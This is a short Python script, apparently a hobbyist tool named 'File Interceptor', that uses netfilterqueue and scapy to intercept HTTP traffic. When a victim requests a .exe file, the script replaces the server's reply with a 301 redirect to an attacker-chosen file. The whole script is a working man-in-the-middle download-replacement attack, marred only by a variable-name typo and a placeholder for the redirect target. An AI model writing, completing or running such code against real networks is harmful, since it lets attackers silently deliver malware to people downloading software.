#/usr/bin/env python

import netfilterqueue
import scapy.all as scapy
import subprocess

subprocess.call(["figlet", "File Interceptor"])
print("\t\t\t\t\t\t by neptune0x13")


ack_list = []

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet =  scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
       if scapy_packet[scapy.TCP].dport == 80:
            if ".exe" in scapy_packey[scapy.Raw].load:     
               print("[+] exe Request")
               ack_list.append(scapy_packet[scapy.TCP].ack)
       elif scapy_packet[scapy.TCP].sport == 80:
           if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] replacing file")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation:[location of file to be replaced with]\n\n")
                packet.set_payload(str(modified_packet))
    
    packet.accept()
   
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()    





























